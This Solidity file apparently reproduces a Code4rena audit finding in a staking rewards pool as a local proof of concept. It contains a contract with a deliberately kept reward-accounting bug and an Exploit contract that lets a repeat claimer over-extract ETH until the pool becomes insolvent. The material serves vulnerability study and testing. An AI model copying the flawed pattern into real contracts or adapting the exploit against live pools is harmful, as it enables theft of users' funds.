// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Stakehouse Protocol -- Any user being the first to claim rewards from
    GiantMevAndFeesPool can unexpectedly collect them all
    (Code4rena 2022-11-stakehouse, finding #43025, H-01, reporter clems4ever)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    SyndicateRewardsProcessor._distributeETHRewardsToUserForToken computes the
    amount newly DUE to a user (accumulated*balance/PRECISION - claimed[user][token])
    and pays it out -- but then does `claimed[user][token] = due` (the amount JUST
    PAID) instead of ADDING due to the running cumulative total. This resets the
    user's "claimed so far" baseline to a value SMALLER than their true lifetime
    claimed total on every claim after the first, so every subsequent claim
    computes an inflated "due" -- letting a repeat claimer extract more ETH than
    their fair pro-rata share of accrued rewards, at the expense of other LP
    holders and the pool's solvency.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced GiantMevAndFeesPool + SyndicateRewardsProcessor -- faithful
///         reduction of contracts/liquid-staking/SyndicateRewardsProcessor.sol
///         (_distributeETHRewardsToUserForToken, _updateAccumulatedETHPerLP) and
///         GiantMevAndFeesPool.sol (_onDepositETH -> _setClaimedToMax, and
///         totalRewardsReceived's idleETH exclusion).
contract GiantMevAndFeesPool {
    uint256 public constant PRECISION = 1e24;
    uint256 public accumulatedETHPerLPShare;
    uint256 public totalClaimed;
    uint256 public totalETHSeen;
    // Real contract keys claimed by (user, LP token address); this reduction has a
    // single receipt token, so LP_TOKEN is a fixed placeholder key.
    address public constant LP_TOKEN = address(0x00000000000000000000000000000000000E71);
    mapping(address => mapping(address => uint256)) public claimed;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    /// @dev Faithful reduction of GiantPoolBase.depositETH + GiantMevAndFeesPool
    ///      ._onDepositETH -> _setClaimedToMax: a fresh depositor is not entitled
    ///      to rewards that accrued before they joined.
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
        claimed[msg.sender][LP_TOKEN] = (accumulatedETHPerLPShare * balanceOf[msg.sender]) / PRECISION;
    }

    /// @dev Stand-in for MEV/fee rewards arriving at the pool independent of any
    ///      deposit/withdraw activity (real: syndicate rewards land via receive()).
    function donateRewards() external payable { }

    /// @dev Faithful reduction of GiantMevAndFeesPool.totalRewardsReceived --
    ///      excludes idle (not-yet-staked) depositor capital from "rewards".
    function totalRewardsReceived() public view returns (uint256) {
        return address(this).balance + totalClaimed - totalSupply;
    }

    /// @dev Faithful reduction of SyndicateRewardsProcessor._updateAccumulatedETHPerLP
    ///      (src/liquid-staking/SyndicateRewardsProcessor.sol#L76-90).
    function updateAccumulatedETHPerLP() public {
        if (totalSupply > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;
            if (unprocessed > 0) {
                // @> real SyndicateRewardsProcessor.sol#L85
                accumulatedETHPerLPShare += (unprocessed * PRECISION) / totalSupply;
                totalETHSeen = received;
            }
        }
    }

    /// @dev Faithful reduction of
    ///      SyndicateRewardsProcessor._distributeETHRewardsToUserForToken
    ///      (src/liquid-staking/SyndicateRewardsProcessor.sol#L51-73).
    function claimRewards(address _recipient) external {
        updateAccumulatedETHPerLP();
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "no balance");

        // @> real SyndicateRewardsProcessor.sol#L61
        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[msg.sender][LP_TOKEN];
        if (due > 0) {
            // @> VULN (real SyndicateRewardsProcessor.sol#L63): sets `claimed` to the
            // amount JUST PAID, not the cumulative running total. On the FIRST-ever
            // claim this happens to equal the correct baseline (claimed started at 0),
            // masking the bug -- but on every claim AFTER the first, this UNDER-writes
            // the true lifetime-claimed total, inflating the "due" computed above on
            // the NEXT claim.
            // FIX: claimed[msg.sender][LP_TOKEN] += due;  (or `= accumulatedETHPerLPShare * balance / PRECISION`)
            claimed[msg.sender][LP_TOKEN] = due;
            totalClaimed += due;
            (bool ok,) = _recipient.call{ value: due }("");
            require(ok, "transfer failed");
        }
    }

    receive() external payable { }
}

/// @dev Per-curator relay so deposits/claims are keyed to a genuinely distinct
///      address inside the pool (cheatcode-free stand-in for vm.startPrank(curator)).
contract Curator {
    GiantMevAndFeesPool public pool;

    constructor(GiantMevAndFeesPool pool_) {
        pool = pool_;
    }

    function stake() external payable {
        pool.deposit{ value: msg.value }();
    }

    function claim() external returns (uint256 received) {
        uint256 before = address(this).balance;
        pool.claimRewards(address(this));
        received = address(this).balance - before;
    }

    receive() external payable { }
}

contract Exploit {
    GiantMevAndFeesPool public pool; // CREATE nonce 1
    Curator public curatorA; // CREATE nonce 2
    Curator public curatorB; // CREATE nonce 3

    uint256 public constant STAKE = 1 ether;
    uint256 public constant REWARD = 10 ether;

    constructor() {
        pool = new GiantMevAndFeesPool();
        curatorA = new Curator(pool);
        curatorB = new Curator(pool);
    }

    receive() external payable { }

    /// @notice Two curators stake EQUAL amounts (50/50 shares). Across three reward
    ///         cycles, curator A repeatedly claims while B never does. Because of the
    ///         `claimed = due` bug, A's third claim pays out DOUBLE their fair 5 ETH
    ///         share of that cycle -- 20 ETH total across 3 claims instead of the fair
    ///         15 ETH -- draining 5 ETH that rightfully belonged to B / the pool.
    ///         Funded via `run()`'s msg.value (see `attackValueWei` in the config).
    function run() external payable {
        require(msg.value == 2 * STAKE + 3 * REWARD, "fund run() with exact working capital");

        curatorA.stake{ value: STAKE }();
        curatorB.stake{ value: STAKE }();

        // === Reward cycle 1: 10 ETH arrives; A claims (their FIRST-ever claim -- correct) ===
        pool.donateRewards{ value: REWARD }();
        uint256 dueA1 = curatorA.claim();
        require(dueA1 == 5 ether, "cycle1: A should get exactly half of the reward");

        // === Reward cycle 2: another 10 ETH arrives; A claims again (still correct --
        // this is exactly A's fair share of cycle 2) ===
        pool.donateRewards{ value: REWARD }();
        uint256 dueA2 = curatorA.claim();
        require(dueA2 == 5 ether, "cycle2: A should get exactly half again");

        // === Reward cycle 3: another 10 ETH arrives; A claims a THIRD time ===
        pool.donateRewards{ value: REWARD }();
        uint256 dueA3 = curatorA.claim();

        // HARM: A's "claimed" baseline was reset to just the LAST payout (5 ether)
        // instead of the true cumulative total (10 ether) after cycle 2 -- so this
        // third claim is computed against the WRONG (too-low) baseline and pays out
        // DOUBLE A's fair 5 ETH share of cycle 3.
        require(dueA3 == 10 ether, "HARM: A's third claim paid double the fair 5 ETH share");

        // B, who never claimed, is fairly entitled to half of ALL three rewards
        // (15 ETH, computed correctly on their first-ever claim) -- but A's earlier
        // over-extraction (20 ETH total instead of the fair 15 ETH) already drained
        // the pool below what accounting now says B deserves.
        uint256 poolBalanceBeforeB = address(pool).balance;
        require(poolBalanceBeforeB == 12 ether, "sanity: only 12 ETH left after A's 20 ETH extraction");

        (bool bClaimOk, uint256 dueB) = _tryClaimB();
        require(!bClaimOk, "HARM: B's fair 15 ETH claim reverts -- pool made insolvent by A's over-extraction");
        dueB;

        uint256 totalPaidOutToA = dueA1 + dueA2 + dueA3;
        require(totalPaidOutToA == 20 ether, "sanity: A extracted 20 ETH total across 3 claims");
        require(totalPaidOutToA > 15 ether, "HARM: A extracted 5 ETH more than their fair 15 ETH pro-rata share");
    }

    /// @dev try/catch wrapper so B's reverting claim doesn't unwind run() -- we want to
    ///      OBSERVE the insolvency, not have it abort the whole demonstration.
    function _tryClaimB() internal returns (bool ok, uint256 amt) {
        try curatorB.claim() returns (uint256 received) {
            ok = true;
            amt = received;
        } catch {
            ok = false;
            amt = 0;
        }
    }
}
